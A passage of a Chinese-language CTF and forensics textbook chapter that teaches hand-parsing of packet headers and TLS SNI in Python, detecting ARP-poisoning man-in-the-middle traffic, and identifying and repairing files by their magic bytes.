+      <p>
+        我們從一個真實的 <strong>TCP SYN 封包</strong>(連線的第一棒)開始。把它的位元組以十六進位排出來,並標上每一段是什麼:
+      </p>
+      <pre><code class="language-text">乙太網路(14B)  6c 4c 36 11 22 33   aa bb cc dd ee ff   08 00
+                └─ 目的 MAC ──┘   └─ 來源 MAC ──┘   └型別 IPv4
+IP 標頭 (20B)  45 00 00 3c 1c 46 40 00 40 06 b1 e6   c0 a8 00 88   cb 44 5c aa
+               └45=v4,IHL5  …  40=TTL64  06=TCP …   └來源IP─┘   └目的IP─┘
+TCP 標頭(20B)  d4 31   01 bb   00000000 00000000   50 02   72 10   e6 32 0000
+               └來源埠 └目的埠443        seq/ack    │ └旗標02=SYN
+                                                    └ 標頭長度 5*4=20</code></pre>
+      <p>
+        現在,用最樸素的 Python 把這串十六進位「切」出每個欄位。關鍵只有一個觀念:<strong>位移(offset)</strong>——
+        每個欄位都在固定的 byte 位置上:
+      </p>
+      <pre><code class="language-python"># 一個 TCP SYN 封包,以十六進位字串表示(乙太網路 + IP + TCP)
+hex_str = (
+    "6c4c36112233aabbccddeeff0800"             # 乙太網路標頭 14 bytes
+    "4500003c1c4640004006b1e6c0a80088cb445caa" # IP 標頭 20 bytes
+    "d43101bb000000000000000050027210e6320000" # TCP 標頭 20 bytes
+)
+data = bytes.fromhex(hex_str)                  # 轉成 bytes,共 54 個位元組
+print("封包總長度 :", len(data), "bytes")
+
+# 把一段位元組切成乙太網路 / IP / 其餘 —— 親眼看見「分層」
+print("乙太網路 :", data[0:14].hex(" "))
+print("IP 標頭  :", data[14:34].hex(" "))
+print("TCP 以後 :", data[34:].hex(" "))</code></pre>
+
+      <h2>封包分析(二):手刻解析 MAC / IP / TCP 旗標</h2>
+      <p>
+        切好了層,現在把每一層裡的<strong>欄位</strong>讀出來。先寫兩個小工具——把連續的位元組變成人看得懂的 MAC 與 IP:
+      </p>
+      <pre><code class="language-python">def mac(off):                    # 從 off 開始取 6 個 byte,拼成 aa:bb:cc:dd:ee:ff
+    return ":".join(f"{x:02x}" for x in data[off:off + 6])
+
+def ipv4(off):                   # 從 off 開始取 4 個 byte,拼成 192.168.0.1
+    return ".".join(str(x) for x in data[off:off + 4])</code></pre>
+      <p>
+        <strong>第一層:乙太網路。</strong>目的 MAC 在 0、來源 MAC 在 6、型別在 12。型別是兩個 byte 拼成的 16 位元數,
+        要把高位 byte「左移 8 位」再跟低位 byte「合併」——<code>0x0800</code> 代表上層是 IPv4:
+      </p>
+      <pre><code class="language-python">dst_mac = mac(0)                 # 6c:4c:36:11:22:33 ← 這一段線路的收件網卡(常是閘道)
+src_mac = mac(6)                 # aa:bb:cc:dd:ee:ff ← 寄件網卡(我的電腦)
+ethertype = (data[12] &lt;&lt; 8) | data[13]    # 兩個 byte 合成 16 位元 → 0x0800 = IPv4
+print(f"目的 MAC : {dst_mac}")
+print(f"來源 MAC : {src_mac}")
+print(f"型別     : {ethertype:#06x}  ({'IPv4' if ethertype == 0x0800 else '其他'})")</code></pre>
+      <p>
+        <strong>第二層:IP。</strong>這裡有個經典陷阱:<strong>IP 標頭長度不一定是 20!</strong>第一個 byte(<code>0x45</code>)的<em>低 4 個 bits</em>
+        是 <strong>IHL(Internet Header Length)</strong>,單位是「4 bytes」。<code>0x45 &amp; 0x0f = 5</code>,所以標頭長 <code>5 × 4 = 20</code> bytes。
+        懂得用 IHL 算長度,是你能正確找到「TCP 從哪裡開始」的關鍵。TTL 在 IP 起點 +8、協定在 +9(<code>6</code>=TCP)、來源/目的 IP 在 +12/+16:
+      </p>
+      <pre><code class="language-python">IP = 14                                    # IP 標頭從第 14 byte 開始
+ihl = (data[IP] &amp; 0x0f) * 4                 # 0x45 → 低4位=5 → 5*4 = 20 bytes
+ttl = data[IP + 8]                          # 存活時間 TTL
+proto = data[IP + 9]                        # 6 = TCP, 17 = UDP, 1 = ICMP
+src_ip = ipv4(IP + 12)                      # 來源 IP
+dst_ip = ipv4(IP + 16)                      # 目的 IP
+print(f"來源 IP : {src_ip}   目的 IP : {dst_ip}")
+print(f"TTL     : {ttl}      協定 : {proto} ({'TCP' if proto == 6 else '?'})")
+print(f"IP 標頭長度 : {ihl} bytes")</code></pre>
+      <p>
+        <strong>第三層:TCP 與旗標。</strong>TCP 接在 IP 後面,起點是 <code>14 + ihl</code>。來源埠、目的埠各是兩個 byte
+        (<code>0x01bb = 443</code>,正是 HTTPS)。最精彩的是第 13 個 byte 的 <strong>旗標(flags)</strong>:它是一個位元遮罩(bitmask),
+        每個 bit 代表一個旗標——<code>SYN=0x02</code>、<code>ACK=0x10</code>、<code>FIN=0x01</code>、<code>RST=0x04</code>、<code>PSH=0x08</code>。
+        要判斷某個旗標有沒有設,就用<strong>位元 AND(<code>&amp;</code>)</strong>去「遮」它:
+      </p>
+      <pre><code class="language-python">TCP = IP + ihl                             # TCP 標頭從這裡開始(= 34)
+src_port = (data[TCP] &lt;&lt; 8) | data[TCP + 1]
+dst_port = (data[TCP + 2] &lt;&lt; 8) | data[TCP + 3]
+flags = data[TCP + 13]                      # 旗標 byte = 0x02
+
+names = []
+for bit, name in [(0x02, "SYN"), (0x10, "ACK"), (0x01, "FIN"),
+                  (0x04, "RST"), (0x08, "PSH")]:
+    if flags &amp; bit:                         # 用位元 AND 檢查這個旗標有沒有設
+        names.append(name)
+
+print(f"{src_ip}:{src_port} → {dst_ip}:{dst_port}")
+print(f"旗標 : {'+'.join(names)}")          # → SYN(這是連線的第一棒)</code></pre>
+
+      <h3>三向交握:從旗標看連線怎麼「開場」</h3>
+      <p>
+        為什麼旗標這麼重要?因為 TCP 連線的開場——<strong>三向交握(three-way handshake)</strong>——整個就寫在旗標裡(第 25 章)。
+        看一串封包的旗標,你就能還原這段「對話」:
+      </p>
+      <div class="diagram">
+<svg viewBox="0 0 720 230" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <defs>
+    <marker id="hs-a" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#2f6f6a"/></marker>
+    <marker id="hs-b" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#b4541f"/></marker>
+  </defs>
+  <rect x="60" y="40" width="150" height="44" rx="8" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="135" y="67" text-anchor="middle" font-size="13" font-weight="800" fill="#2f6f6a">客戶端(我)</text>
+  <rect x="510" y="40" width="150" height="44" rx="8" fill="#fdece5" stroke="#b4541f" stroke-width="2"/>
+  <text x="585" y="67" text-anchor="middle" font-size="13" font-weight="800" fill="#b4541f">伺服器</text>
+  <line x1="135" y1="84" x2="135" y2="210" stroke="#8a929b" stroke-width="1.5"/>
+  <line x1="585" y1="84" x2="585" y2="210" stroke="#8a929b" stroke-width="1.5"/>
+
+  <line x1="135" y1="110" x2="585" y2="110" stroke="#2f6f6a" stroke-width="2.2" marker-end="url(#hs-a)"/>
+  <text x="360" y="102" text-anchor="middle" font-size="12" font-weight="700" fill="#2f6f6a">① SYN(旗標 0x02)「喂?在嗎」</text>
+
+  <line x1="585" y1="150" x2="135" y2="150" stroke="#b4541f" stroke-width="2.2" marker-end="url(#hs-b)"/>
+  <text x="360" y="142" text-anchor="middle" font-size="12" font-weight="700" fill="#b4541f">② SYN+ACK(0x12)「在!你也準備好喔」</text>
+
+  <line x1="135" y1="190" x2="585" y2="190" stroke="#2f6f6a" stroke-width="2.2" marker-end="url(#hs-a)"/>
+  <text x="360" y="182" text-anchor="middle" font-size="12" font-weight="700" fill="#2f6f6a">③ ACK(0x10)「收到,開始吧」</text>
+</svg>
+        <figcaption>圖 71-4:TCP 三向交握。<code>SYN=0x02</code>、<code>ACK=0x10</code>,所以第二棒「SYN+ACK」的旗標 byte 是 <code>0x02 | 0x10 = 0x12</code>。能從旗標還原這段對話,你就真正讀懂 TCP 了。</figcaption>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 71.4 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>給你一個封包的十六進位字串(乙太網路 + IP + TCP),請用純 Python(不裝套件)解析出:
+          (a) 來源/目的 IP;(b) TTL 與協定;(c) 來源/目的埠;(d) TCP 旗標(SYN/ACK/...)。
+          請特別<strong>用 IHL 正確算出 IP 標頭長度</strong>,別寫死成 20。用這個封包測試:</p>
+          <pre><code class="language-text">6c4c36112233aabbccddeeff0800
+4500003c1c4640004006b1e6c0a80088cb445caa
+d43101bb000000000000000050027210e6320000</code></pre>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-python">hex_str = ("6c4c36112233aabbccddeeff0800"
+           "4500003c1c4640004006b1e6c0a80088cb445caa"
+           "d43101bb000000000000000050027210e6320000")
+data = bytes.fromhex(hex_str)
+
+def ipv4(off):
+    return ".".join(str(x) for x in data[off:off + 4])
+
+IP = 14
+ihl = (data[IP] &amp; 0x0f) * 4                 # (a)(b) 用 IHL 算長度,不寫死 20
+src_ip, dst_ip = ipv4(IP + 12), ipv4(IP + 16)
+ttl, proto = data[IP + 8], data[IP + 9]
+
+TCP = IP + ihl                              # (c) TCP 起點 = 14 + IP 標頭長度
+src_port = (data[TCP] &lt;&lt; 8) | data[TCP + 1]
+dst_port = (data[TCP + 2] &lt;&lt; 8) | data[TCP + 3]
+
+flags = data[TCP + 13]                      # (d) 旗標
+names = [n for bit, n in [(0x02,"SYN"),(0x10,"ACK"),(0x01,"FIN"),
+                          (0x04,"RST"),(0x08,"PSH")] if flags &amp; bit]
+
+print(f"{src_ip}:{src_port} → {dst_ip}:{dst_port}")
+print(f"TTL={ttl}  協定={proto}  旗標={'+'.join(names)}")
+# 預期:192.168.0.136:54321 → 203.68.92.170:443
+#       TTL=64  協定=6  旗標=SYN</code></pre>
+              <p>關鍵在 <code>ihl = (data[14] &amp; 0x0f) * 4</code>:第一個 byte 的低 4 位是 IHL,乘 4 才是標頭實際長度。
+              若有 IP 選項(options),IHL 會大於 5,寫死 20 就會把 TCP 起點算錯。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>封包分析(三):從 TLS ClientHello 挖出 SNI 網址</h2>
+      <p>
+        現在來破除一個常見的誤解:「網站都上 HTTPS 了,封包都加密了,旁邊的人應該什麼都看不到吧?」——<strong>不全對</strong>。
+        HTTPS(第 25、35、52 章)確實把<strong>連線內容</strong>加密了,但在加密真正建立<em>之前</em>,客戶端要先送一個
+        <strong>ClientHello</strong> 跟伺服器打招呼,而這個招呼裡有一個欄位是<strong>明文</strong>的:
+        <strong>SNI(Server Name Indication,伺服器名稱指示)</strong>——也就是你<strong>要連去哪個網域</strong>。
+      </p>
+      <p>
+        為什麼需要 SNI?因為一台伺服器常同時架了好幾個網站(共用同一個 IP),客戶端必須在握手時先講明「我要找的是
+        <code>www.example.com</code>」,伺服器才知道該拿哪張憑證出來。代價就是:<strong>你連線的內容被保護了,但你「造訪了哪個網站」這件事,仍然會曝光。</strong>
+        這對隱私、對 CTF 鑑識題,都是關鍵線索。
+      </p>
+      <p>
+        ClientHello 藏在 TCP 的資料(payload)裡,結構一層套一層,但只要照著「<strong>長度欄位</strong>」一段一段跳過去,就能定位到 SNI。
+        我們手刻一個簡化版的解析器(假設封包不含 IP 選項):
+      </p>
+      <pre><code class="language-python">def u16(b, off):                 # 兩個 byte 拼成一個 16 位元整數(大端序)
+    return (b[off] &lt;&lt; 8) | b[off + 1]
+
+def tcp_payload(data):           # 切掉乙太網路+IP+TCP 標頭,取出真正的資料
+    ihl = (data[14] &amp; 0x0f) * 4
+    t = 14 + ihl
+    tcp_hdr = ((data[t + 12] &gt;&gt; 4) &amp; 0x0f) * 4   # TCP 標頭長度也要算
+    return data[t + tcp_hdr:]
+
+def find_sni(payload):
+    # TLS record: 0x16=Handshake, 之後 payload[5] 應為 0x01=ClientHello
+    if len(payload) &lt; 6 or payload[0] != 0x16 or payload[5] != 0x01:
+        return None
+    p = 5 + 4 + 2 + 32           # 跳過 record 標頭+握手型別/長度+版本+32 位元組亂數
+    p += 1 + payload[p]          # 跳過 session id(1 byte 長度 + 內容)
+    p += 2 + u16(payload, p)     # 跳過 cipher suites(2 byte 長度 + 內容)
+    p += 1 + payload[p]          # 跳過壓縮方法(1 byte 長度 + 內容)
+    ext_total = u16(payload, p); p += 2          # 擴充欄位(extensions)總長
+    end = p + ext_total
+    while p + 4 &lt;= end:          # 逐一掃過每個擴充欄位
+        etype = u16(payload, p)
+        elen = u16(payload, p + 2)
+        p += 4
+        if etype == 0x0000:                      # 0x0000 = server_name(SNI)
+            name_len = u16(payload, p + 3)
+            return payload[p + 5: p + 5 + name_len].decode("ascii")
+        p += elen
+    return None
+
+sni = find_sni(tcp_payload(data))
+print("這條連線要造訪的網址(SNI) :", sni)   # 例如 www.cyivs.cy.edu.tw</code></pre>
+      <div class="callout note">
+        <div class="ico">🔒</div>
+        <div class="body">
+          <span class="c-title">加密保護「內容」,但不一定保護「去向」</span>
+          <p>這一關最該帶走的觀念,不是那串解析程式碼,而是:<strong>「加密」和「匿名」是兩件事。</strong>
+          TLS 讓中間人讀不到你傳輸的內容(密碼、訊息),但傳統的 SNI 仍以明文洩漏「你造訪了哪個網站」;
+          DNS 查詢(若沒加密)也會洩漏同樣的資訊。這也是為什麼近年有 <strong>Encrypted ClientHello(ECH)</strong> 與
+          DNS over HTTPS(DoH)等技術,試圖把這最後一塊「去向」也藏起來。理解這條界線,你才知道 HTTPS 到底保護了什麼、沒保護什麼。</p>
+        </div>
+      </div>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 71.5 <span class="badge">挑戰</span></div>
+        <div class="ex-body">
+          <p>用上面的 <code>find_sni()</code>,寫一支程式讀進一個含 ClientHello 的封包(十六進位),把 SNI 網址挖出來。
+          然後回答兩個問題:(a) 為什麼這個網址是明文,而連線「之後」的內容卻是加密的?
+          (b) 如果你是個只想保護「通訊內容不被偷看」的開發者,SNI 明文這件事對你重要嗎?如果你想保護的是使用者的「上網隱私」呢?</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <p><strong>(a)</strong> 因為 SNI 出現在 <strong>TLS 握手的第一個訊息(ClientHello)</strong>裡——
+              此時加密通道<em>還沒建立</em>(雙方還在協商要用哪套加密、伺服器還沒出示憑證)。而伺服器又必須<em>先</em>知道你要找哪個網域,
+              才能挑出對應的憑證。這是一個「先有雞還是先有蛋」的兩難,傳統 TLS 的妥協就是讓 SNI 走明文。握手完成、加密通道建立後,
+              後續所有應用資料(HTTP 請求/回應)才被加密。</p>
+              <p><strong>(b)</strong> 取決於你的威脅模型:
+              若你只在乎「<strong>傳輸內容</strong>(密碼、個資)不被竊聽或竄改」,那 TLS 已經做到了,SNI 明文無傷大雅。
+              但若你在乎使用者的「<strong>上網隱私</strong>」——不希望 ISP、Wi-Fi 提供者、網路上的觀察者知道他<em>造訪了哪些網站</em>——
+              那 SNI(以及未加密的 DNS)就是一個實實在在的洩漏點,需要 ECH / DoH 之類的技術才能補上。
+              這題的價值,正是逼你分清「加密內容」與「隱藏去向」是兩個不同的安全目標。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>封包分析(壓軸):揪出 ARP 投毒的中間人</h2>
+      <p>
+        現在是封包分析的壓軸,也是把<strong>第 34 章中間人攻擊(MITM)</strong>從理論變成「親手抓到」的時刻。
+        我們要當一次偵探,從一份抓包檔裡,揪出一個躲在區域網路裡的<strong>中間人</strong>。
+      </p>
+
+      <h3>原理:ARP 投毒怎麼成立</h3>
+      <p>
+        先理解攻擊。在區域網路裡,電腦要傳資料給「閘道器(gateway,通往外網的門)」,它得先知道閘道的 <strong>MAC 位址</strong>。
+        它怎麼知道?靠 <strong>ARP(Address Resolution Protocol)</strong>:大聲廣播問「誰是 192.168.0.1?把你的 MAC 告訴我」。
+        問題在於——<strong>ARP 完全沒有驗證機制</strong>,誰回答它就信誰。
+      </p>
+      <p>
+        <strong>ARP 投毒(ARP spoofing / poisoning)</strong>就鑽這個洞:攻擊者不斷發送偽造的 ARP 回應,
+        對受害電腦謊稱「<strong>我</strong>才是閘道(192.168.0.1 的 MAC 是<em>我的</em>)」,同時對閘道謊稱「我才是那台受害電腦」。
+        於是受害者所有「要送往外網」的封包,都先送到了<strong>攻擊者的網卡</strong>,攻擊者看完(甚至竄改)再轉給真正的閘道。
+        受害者完全無感——這就是<strong>中間人</strong>:他坐在你和閘道之間,你的流量全部過他的手。
+      </p>
+
+      <div class="diagram">
+<svg viewBox="0 0 720 290" xmlns="http://www.w3.org/2000/svg" font-family="Inter, 'Noto Sans TC', sans-serif">
+  <defs>
+    <marker id="mitm-a" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#b4541f"/></marker>
+    <marker id="mitm-b" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto"><path d="M0,0 L8,3 L0,6 Z" fill="#8a929b"/></marker>
+  </defs>
+  <text x="360" y="24" text-anchor="middle" font-size="13" font-weight="800" fill="#1f2328">ARP 投毒:同一個「閘道角色」,冒出兩個 MAC</text>
+
+  <rect x="40" y="120" width="150" height="60" rx="10" fill="#e3efed" stroke="#2f6f6a" stroke-width="2"/>
+  <text x="115" y="146" text-anchor="middle" font-size="12" font-weight="800" fill="#2f6f6a">受害電腦</text>
+  <text x="115" y="166" text-anchor="middle" font-size="10" fill="#4a5159">192.168.0.136</text>
+
+  <rect x="530" y="120" width="150" height="60" rx="10" fill="#eafaf0" stroke="#2f9e5b" stroke-width="2"/>
+  <text x="605" y="146" text-anchor="middle" font-size="12" font-weight="800" fill="#2f9e5b">真正的閘道</text>
+  <text x="605" y="166" text-anchor="middle" font-size="10" fill="#4a5159">MAC 6c:4c:...(原廠)</text>
+
+  <rect x="285" y="220" width="150" height="56" rx="10" fill="#fdece5" stroke="#b4541f" stroke-width="2"/>
+  <text x="360" y="244" text-anchor="middle" font-size="12" font-weight="800" fill="#b4541f">攻擊者(中間人)</text>
+  <text x="360" y="262" text-anchor="middle" font-size="10" fill="#4a5159">MAC 12:ef:...(偽造)</text>
+
+  <!-- victim thinks it talks to gateway but goes to attacker -->
+  <line x1="190" y1="158" x2="287" y2="232" stroke="#b4541f" stroke-width="2.4" marker-end="url(#mitm-a)"/>
+  <text x="200" y="210" font-size="10.5" fill="#b4541f">流量其實先進了攻擊者網卡</text>
+  <line x1="433" y1="232" x2="535" y2="162" stroke="#8a929b" stroke-width="2" stroke-dasharray="5 3" marker-end="url(#mitm-b)"/>
+  <text x="470" y="216" font-size="10.5" fill="#8a929b">看完再轉給真閘道</text>
+
+  <line x1="190" y1="140" x2="528" y2="140" stroke="#8a929b" stroke-width="1.4" stroke-dasharray="4 4"/>
+  <text x="360" y="132" text-anchor="middle" font-size="10.5" fill="#8a929b">受害者「以為」自己在直接跟閘道講話</text>
+</svg>
+        <figcaption>圖 71-5:ARP 投毒中間人。破案的線索藏在這句話裡:<strong>「閘道/伺服器」這個 IP 角色,在封包裡卻對應到了兩個不同的 MAC</strong>——一個是原廠網卡,一個是攻擊者偽造的。</figcaption>
+      </div>
+
+      <h3>怎麼從封包抓到他:兩條鐵證</h3>
+      <p>
+        當偵探,我們有兩條互相印證的線索:
+      </p>
+      <ul>
+        <li><strong>線索一:同一個 IP,對應到兩個 MAC。</strong>電腦「送出去」的封包,目的 MAC 都交給閘道(<code>6c:4c:...</code>);
+        但「收回來」的封包,來源 MAC 卻有很高比例是一個<strong>陌生的 MAC</strong>(<code>12:ef:...</code>)。同一個對外角色,MAC 卻不一致,非常可疑。</li>
+        <li><strong>線索二:那個陌生 MAC 是「軟體偽造」的。</strong>MAC 位址的第一個 byte 裡,有一個 <strong>U/L 位元(本地管理位元,locally administered bit,值 <code>0x02</code>)</strong>:
+        原廠燒進網卡的 MAC,這個位元通常是 <code>0</code>;而軟體<em>自己捏造</em>的 MAC,常會把這個位元設成 <code>1</code>。
+        用 <code>第一個byte &amp; 0x02</code> 一驗就知道。</li>
+      </ul>
+      <pre><code class="language-python">from collections import Counter
+
+CLIENT_IP = "192.168.0.136"      # 受害電腦
+GATEWAY_OR_SERVER_IP = "203.68.92.170"   # 對外的另一端
+
+def mac(data, off):
+    return ":".join(f"{x:02x}" for x in data[off:off + 6])
+
+def ipv4(data, off):
+    return ".".join(str(x) for x in data[off:off + 4])
+
+def is_spoofed(mac_str):         # 本地管理位元(0x02)被設 → 軟體偽造
+    first_byte = int(mac_str.split(":")[0], 16)
+    return (first_byte &amp; 0x02) != 0
+
+outbound = Counter()             # 出向:電腦把封包「交給」哪些 MAC
+inbound = Counter()              # 入向:回來的封包「來自」哪些 MAC
+
+for ts, data in packets:         # packets 是你從抓包檔解析出的所有封包
+    src_ip, dst_ip = ipv4(data, 26), ipv4(data, 30)   # 14+12, 14+16
+    dst_mac, src_mac = mac(data, 0), mac(data, 6)
+    if src_ip == CLIENT_IP:
+        outbound[dst_mac] += 1
+    elif src_ip == GATEWAY_OR_SERVER_IP:
+        inbound[src_mac] += 1
+
+print("【出向】電腦把封包交給的 MAC :", outbound.most_common())
+print("【入向】回來的封包來自的 MAC :")
+total = sum(inbound.values()) or 1
+for m, c in inbound.most_common():
+    tag = " ⚠️ 軟體偽造!" if is_spoofed(m) else " (原廠網卡)"
+    print(f"   {m}  ×{c}  ({c * 100 // total}%){tag}")
+
+# 自動下結論
+suspects = [m for m in inbound if is_spoofed(m)]
+if suspects and outbound:
+    print("\n🚨 高度懷疑 ARP 投毒中間人:出向都交給閘道,")
+    print(f"   但 {sum(inbound[m] for m in suspects)} 個回程封包來自偽造 MAC {suspects}")</code></pre>
+      <div class="callout warn">
+        <div class="ico">⚠️</div>
+        <div class="body">
+          <span class="c-title">偵測到異常 ≠ 一定是攻擊</span>
+          <p>抓到「同一 IP 兩個 MAC + 偽造 MAC」是強烈的可疑訊號,但下結論前要保持鑑識的嚴謹(第 53 章):
+          <strong>也可能是合法的網路設備</strong>——例如某些企業/校園的<strong>合法側錄或流量管理設備</strong>、負載平衡、
+          或網路架構造成的正常現象。正確的態度是:把它當成「<strong>需要進一步查清的高度可疑事件</strong>」,
+          去確認那台裝置到底是什麼、是否獲授權,而不是一看到就斷言「被駭了」。鑑識講求證據與謹慎,不是腦補。</p>
+        </div>
+      </div>
+      <p>
+        <strong>那要怎麼防 ARP 投毒?</strong>根本問題是 ARP 沒有驗證。實務上的防線有:在交換器上開啟
+        <strong>Dynamic ARP Inspection(DAI)</strong> 與 DHCP Snooping、對關鍵主機設定<strong>靜態 ARP 表</strong>、
+        以及最重要的一層——<strong>全程使用 HTTPS/TLS</strong>:即使攻擊者真的當了中間人,沒有有效憑證,他也<strong>解不開、也無法神不知鬼不覺地竄改</strong>你的加密流量(這正是第 52 章說的,TLS 是擋 MITM 的關鍵)。
+      </p>
+      <p>
+        最後,工具一句話:以上我們全部手刻,是為了<strong>練底層功</strong>;在真實工作裡,你會用 <strong>Wireshark</strong>——
+        業界標準的封包分析工具,它能把抓包檔(<code>.pcap</code>)用圖形介面漂亮地分層展開,還能用過濾器(如 <code>arp</code>、<code>eth.src==12:ef:...</code>)
+        瞬間篩出你要的封包。但能手刻的人,用 Wireshark 會更清楚自己在看什麼。
+      </p>
+
+      <h2>檔案鑑識(一):魔術位元組與檔案修復</h2>
+      <p>
+        最後一條路線:<strong>檔案鑑識(forensics)</strong>,呼應<strong>第 53 章</strong>。CTF 的鑑識題,常常給你一個「看起來普通」的檔案,
+        要你看穿它的真面目、挖出藏在裡面的祕密。我們從最基本、也最重要的觀念開始:<strong>檔案不靠副檔名決定身分</strong>。
+      </p>
+      <p>
+        副檔名(<code>.jpg</code>、<code>.pdf</code>)只是<strong>給人看的標籤,可以隨便改</strong>。一個檔案<em>真正</em>是什麼,
+        看的是它開頭那幾個位元組——<strong>魔術位元組(magic bytes),也叫檔案簽章(file signature)</strong>。
+        每種格式都有固定的開頭:
+      </p>
+      <div class="table-wrap">
+      <table>
+        <thead><tr><th>檔案類型</th><th>魔術位元組(十六進位)</th><th>可見字元</th></tr></thead>
+        <tbody>
+          <tr><td>PNG 圖片</td><td><code>89 50 4E 47 0D 0A 1A 0A</code></td><td><code>.PNG....</code></td></tr>
+          <tr><td>JPEG 圖片</td><td><code>FF D8 FF</code></td><td>(不可見)</td></tr>
+          <tr><td>GIF 圖片</td><td><code>47 49 46 38</code></td><td><code>GIF8</code></td></tr>
+          <tr><td>PDF 文件</td><td><code>25 50 44 46</code></td><td><code>%PDF</code></td></tr>
+          <tr><td>ZIP / docx / jar</td><td><code>50 4B 03 04</code></td><td><code>PK..</code></td></tr>
+          <tr><td>ELF 執行檔(Linux)</td><td><code>7F 45 4C 46</code></td><td><code>.ELF</code></td></tr>
+        </tbody>
+      </table>
+      </div>
+      <p>
+        在終端機裡,三個工具是鑑識的瑞士刀:<code>file</code>(<strong>靠魔術位元組</strong>判斷真實類型,不理會副檔名)、
+        <code>strings</code>(把檔案裡所有「可見文字」撈出來——旗標常常就這樣裸奔在裡面)、
+        <code>xxd</code>(以十六進位 + ASCII 並排顯示,讓你看清每個位元組):
+      </p>
+      <pre><code class="language-bash"># file:看穿真實類型(就算副檔名造假也騙不過它)
+file mystery.jpg
+# mystery.jpg: PNG image data, 800 x 600   ← 副檔名是 jpg,其實是 PNG!
+
+# strings:把檔案裡的可見字串撈出來,直接 grep 找旗標
+strings firmware.bin | grep FLAG
+
+# xxd:看檔頭的十六進位(確認魔術位元組)
+xxd mystery.jpg | head -n 2</code></pre>
+      <p>
+        用 Python 做同樣的事(純標準庫):
+      </p>
+      <pre><code class="language-python">SIGNATURES = {
+    b"\x89PNG\r\n\x1a\n": "PNG 圖片",
+    b"\xff\xd8\xff":      "JPEG 圖片",
+    b"GIF87a":            "GIF 圖片",
+    b"GIF89a":            "GIF 圖片",
+    b"%PDF":              "PDF 文件",
+    b"PK\x03\x04":        "ZIP / docx / jar ...",
+    b"\x7fELF":           "ELF 執行檔",
+}
+
+def identify(path):
+    head = open(path, "rb").read(16)
+    for sig, name in SIGNATURES.items():
+        if head.startswith(sig):
+            return name
+    return "未知(可能副檔名造假或檔頭損壞)"
+
+print(identify("mystery.jpg"))     # → PNG 圖片(副檔名騙不了魔術位元組)
+
+# 撈出檔案裡的旗標(strings 的 Python 版)
+import re
+data = open("firmware.bin", "rb").read()
+m = re.search(rb"FLAG\{[^}]*\}", data)    # bytes 模式的正規表示式
+print("夾帶文字裡的旗 :", m.group(0).decode() if m else "(沒找到)")</code></pre>
+
+      <h3>檔案修復:把壞掉的檔頭補回去</h3>
+      <p>
+        懂了魔術位元組,你就能做一件很「CTF」的事:<strong>修復檔案</strong>。題目常給你一個「打不開」的圖片——
+        往往就是檔頭的魔術位元組被故意改壞了。你只要把正確的簽章補回去,檔案就活了:
+      </p>
+      <pre><code class="language-python"># 一個「打不開」的 PNG:前 8 個 byte 被改壞了
+PNG_MAGIC = b"\x89PNG\r\n\x1a\n"           # PNG 正確的 8 byte 簽章
+data = open("broken.png", "rb").read()
+print("壞掉的檔頭 :", data[:8].hex(" "))
+
+fixed = PNG_MAGIC + data[8:]               # 把前 8 byte 換回正確簽章
+open("fixed.png", "wb").write(fixed)
+print("修好了!現在 fixed.png 可以正常打開")</code></pre>
+      <p>
+        這背後的觀念很深刻:<strong>檔案的「結構」是有規則的</strong>——有固定的開頭、固定的區塊格式、固定的結尾標記。
+        鑑識的本事,就是熟悉這些規則,於是你能看出「哪裡不對勁、哪裡被動過手腳、哪裡藏了東西」。
+      </p>
+
+      <div class="exercise">
+        <div class="ex-head">✏️ 練習 71.6 <span class="badge">實作</span></div>
+        <div class="ex-body">
+          <p>(a) 寫一支 <code>identify()</code>,用魔術位元組判斷一個檔案的真實類型,並驗證一個「副檔名是 <code>.jpg</code> 但其實是 PNG」的檔案。
+          (b) 給你一個檔頭被改壞、打不開的 PNG,把它修好。(c) 用 Python 把檔案裡的 <code>FLAG{...}</code> 撈出來(strings 的效果)。</p>
+          <details class="solution">
+            <summary>看解答</summary>
+            <div class="sol-body">
+              <pre><code class="language-python">import re
+
+SIGNATURES = {
+    b"\x89PNG\r\n\x1a\n": "PNG", b"\xff\xd8\xff": "JPEG",
+    b"GIF87a": "GIF", b"GIF89a": "GIF", b"%PDF": "PDF",
+    b"PK\x03\x04": "ZIP", b"\x7fELF": "ELF",
+}
+
+def identify(path):                         # (a) 看魔術位元組
+    head = open(path, "rb").read(16)
+    for sig, name in SIGNATURES.items():
+        if head.startswith(sig):
+            return name
+    return "未知"
+
+print("mystery.jpg 其實是 :", identify("mystery.jpg"))   # → PNG
+
+# (b) 修復被改壞檔頭的 PNG
+PNG_MAGIC = b"\x89PNG\r\n\x1a\n"
+raw = open("broken.png", "rb").read()
+open("fixed.png", "wb").write(PNG_MAGIC + raw[8:])
+print("已修復 → fixed.png")
+
+# (c) strings:撈出檔案裡的旗標
+data = open("firmware.bin", "rb").read()
+m = re.search(rb"FLAG\{[^}]*\}", data)
+print("旗標 :", m.group(0).decode() if m else "(沒找到)")</code></pre>
+              <p>三題的共同核心:<strong>檔案的身分與完整性,寫在它的位元組裡,不在副檔名裡。</strong>
+              <code>identify</code> 看開頭判斷類型;修復是把開頭改回正確簽章;strings 則是無視結構、直接掃出所有可見文字。</p>
+            </div>
+          </details>
+        </div>
+      </div>
+
+      <h2>檔案鑑識(二):metadata 與 EXIF</h2>
+      <p>
+        檔案除了「內容」,還帶著一層你常常忽略的東西:<strong>中繼資料(metadata)</strong>——關於這個檔案本身的資料。
+        其中最有名、也最常洩漏隱私的,是照片裡的 <strong>EXIF(Exchangeable Image File Format)</strong>。
+      </p>
+      <p>
